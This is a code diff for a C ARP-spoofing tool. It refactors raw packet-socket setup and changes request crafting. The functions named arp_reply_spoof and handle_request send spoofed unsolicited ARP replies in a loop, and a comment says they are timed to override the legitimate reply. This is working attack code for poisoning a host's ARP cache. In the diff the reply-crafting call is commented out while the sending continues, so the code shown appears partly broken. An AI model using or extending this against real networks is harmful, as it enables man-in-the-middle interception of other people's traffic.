@@ -21,6 +21,20 @@ bool	in_same_network(uint8_t *ip1, uint8_t *ip2, uint8_t *mask, int len) {
 	return (true);
 }
 
+struct sockaddr_ll	create_sockaddr(int interface_index, uint8_t *dest_mac, uint8_t hlen) {
+	struct sockaddr_ll	addr;
+
+	bzero(&addr, sizeof(addr));
+
+	addr.sll_family = AF_PACKET;
+	addr.sll_protocol = htons(ETH_P_ARP);
+	addr.sll_ifindex = interface_index;
+	addr.sll_halen = hlen;
+	memcpy(addr.sll_addr, dest_mac, hlen);
+
+	return (addr);
+}
+
 int	get_interace_index(struct ifaddrs *ifaddr, struct ifaddrs *ifa) {
 
 	struct ifaddrs	*ifa2;
@@ -119,27 +133,19 @@ void	craft_arp_reply(t_ArpPacket *request, t_ArpPacket *reply) {
 	memcpy(reply->tpa, args.tar_ip, reply->pln);
 }
 
-int	handle_request(char *buff, int packet_socket, int interface_index) {
+int	handle_request(char *buff, int packet_socket, int interface_index, struct sockaddr_ll *addr) {
 
 	t_ArpPacket			request, reply;
-	struct sockaddr_ll	addr;
 
 	bzero(&request, sizeof(request));
 	bzero(&reply, sizeof(reply));
-	bzero(&addr, sizeof(addr));
 
 	if (parse_request(buff, &request) != 0) {
 		fprintf(stderr, "Failed to parse ARP request\n");
 		return (1);
 	}
 	show_request_info(&request);
-	craft_arp_reply(&request, &reply);
-
-	addr.sll_family = AF_PACKET;
-	addr.sll_protocol = htons(ETH_P_ARP);
-	addr.sll_ifindex = interface_index;
-	addr.sll_halen = reply.hln;
-	memcpy(addr.sll_addr, reply.dest, ETHER_ADDR_LEN);
+	// craft_arp_reply(&request, &reply);
 
 	// Sleep for a short time to let the legitimate ARP reply arive before our spoofed unsolicited reply.
 	// This will only work if the target system accepts unsolicited ARP replies.
@@ -147,7 +153,7 @@ int	handle_request(char *buff, int packet_socket, int interface_index) {
 		sleep(2);
 
 	while (1) {
-		if (sendto(packet_socket, &reply, sizeof(reply), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+		if (sendto(packet_socket, &reply, sizeof(reply), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_ll)) < 0) {
 			puts( strerror( errno ) );
 			return (1);
 		}
@@ -167,10 +173,8 @@ int	arp_reply_spoof(int interface_index) {
 	int					packet_socket, recvd;
 	char				buff[ETH_ZLEN];
 	uint16_t			opcode;
-	struct	sockaddr_ll	src_addr;
+	struct	sockaddr_ll	src_addr, target_addr;
 	socklen_t			src_addr_len = sizeof(src_addr);
-
-	bzero(&src_addr, sizeof(src_addr));
 
 	// Create a packet socket.
 	packet_socket = socket (AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
@@ -178,6 +182,11 @@ int	arp_reply_spoof(int interface_index) {
 		puts( strerror( errno ) );
 		return (-1);
 	}
+
+	bzero(&src_addr, sizeof(src_addr));
+	bzero(&target_addr, sizeof(target_addr));
+
+	target_addr = create_sockaddr(interface_index, args.tar_mac, ETHER_ADDR_LEN);
 
 	// Listen for ARP requests and process the first one we receive.
 	while (1) {
@@ -202,7 +211,7 @@ int	arp_reply_spoof(int interface_index) {
 		}
 	}
 
-	if (handle_request(buff, packet_socket, interface_index) != 0) {
+	if (handle_request(buff, packet_socket, interface_index, &target_addr) != 0) {
 		fprintf(stderr, "Failed to handle ARP request\n");
 		close(packet_socket);
 		return (-1);
@@ -229,7 +238,8 @@ void	craft_arp_request(t_ArpPacket *request) {
 	memcpy(request->sha, args.src_mac, request->hln);
 	memcpy(request->spa, args.src_ip, request->pln);
 
-	memcpy(request->tha, args.tar_mac, request->hln);
+	// Because this is an ARP request, the target hardware addresses is set to zero.
+	bzero(request->tha, request->hln);
 	memcpy(request->tpa, args.tar_ip, request->pln);
 }
 
